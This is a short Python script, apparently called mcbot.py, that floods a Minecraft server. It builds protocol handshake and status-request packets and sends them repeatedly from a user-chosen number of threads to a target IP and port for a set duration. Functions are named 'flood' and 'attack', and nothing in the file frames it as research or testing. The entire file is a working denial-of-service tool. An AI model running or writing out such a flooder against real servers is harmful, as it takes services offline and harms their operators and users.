import socket
import struct
import sys
import threading
import random
from time import time as tt

def create_handshake_packet(ip, port, protocol_version=754):
    ip_encoded = ip.encode('utf-8')
    data = b''

    data += b'\x00'  # Packet ID for handshake
    data += encode_varint(protocol_version)
    data += encode_varint(len(ip_encoded)) + ip_encoded
    data += struct.pack('>H', port)
    data += encode_varint(1)  # Next state: status

    return encode_varint(len(data)) + data

def create_status_request_packet():
    return b'\x01\x00'  # Length + Packet ID for status request

def encode_varint(value):
    result = b''
    while True:
        temp = value & 0b01111111
        value >>= 7
        if value != 0:
            temp |= 0b10000000
        result += struct.pack('B', temp)
        if value == 0:
            break
    return result

def flood(ip, port, duration):
    timeout = tt() + duration
    while tt() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))

            handshake = create_handshake_packet(ip, port)
            status = create_status_request_packet()

            s.sendall(handshake)
            s.sendall(status)
            s.close()
        except:
            pass

def attack(ip, port, duration, threads):
    print(f"[INFO] Flooding {ip}:{port} for {duration}s using {threads} threads...")
    for _ in range(threads):
        threading.Thread(target=flood, args=(ip, port, duration)).start()

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("Usage: python3 mcbot.py <ip> <port> <duration> <threads>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = int(sys.argv[4])

    attack(ip, port, duration, threads)
